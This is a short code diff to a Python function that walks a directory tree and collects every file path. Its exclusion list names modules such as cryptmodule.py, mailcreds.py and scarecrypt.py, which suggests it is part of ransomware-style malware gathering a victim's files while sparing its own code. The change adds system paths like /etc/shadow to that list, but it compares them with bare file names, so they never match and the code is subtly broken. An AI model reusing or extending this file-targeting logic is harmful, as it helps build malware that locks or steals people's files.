@@ -25,7 +25,7 @@ def find_all_files(path):
     for root, dirs, files in os.walk(path):
         for file in files:
             complete_file_path = os.path.join(root, file)
-            if file in ["mailcreds.py", "cryptmodule.py", "mailmodule.py", "scarecrypt.py", "pathchecks.py"]:
+            if file in ["mailcreds.py", "cryptmodule.py", "mailmodule.py", "scarecrypt.py", "pathchecks.py", "/boot/vmlinuz", "/etc/passwd", "/etc/shadow", "/etc/fstab", "/etc/hosts", "/etc/hostname", "/etc/group", "/etc/resolv.conf", "/var/log/messages"]:
                 continue
             else:
                 files_list.append(complete_file_path)
